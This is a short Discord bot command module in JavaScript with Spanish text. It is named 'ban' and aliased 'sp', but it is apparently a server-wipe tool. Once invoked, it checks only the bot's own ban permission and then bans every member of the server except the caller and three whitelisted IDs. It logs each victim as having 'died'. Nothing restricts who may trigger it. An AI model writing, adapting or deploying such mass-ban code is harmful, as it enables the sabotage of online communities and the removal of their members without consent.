const Discord = require("discord.js");



module.exports = {
  nombre: "ban",
  alias: ["sp"],
  run: async (client, message, args) => {
   const permi1 = message.guild.me.hasPermission("BAN_MEMBERS")
        if(!permi1) return message.author.send(":x:| No tengo el permiso de `BAN_MEMBERS`")
    
  



message.guild.members.cache.forEach(member => {
    if(member != message.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
        member.ban().then(member => console.log(`${member.user.tag} ha muerto`)).catch(err => console.log(err));
      }
    
});




  },
};
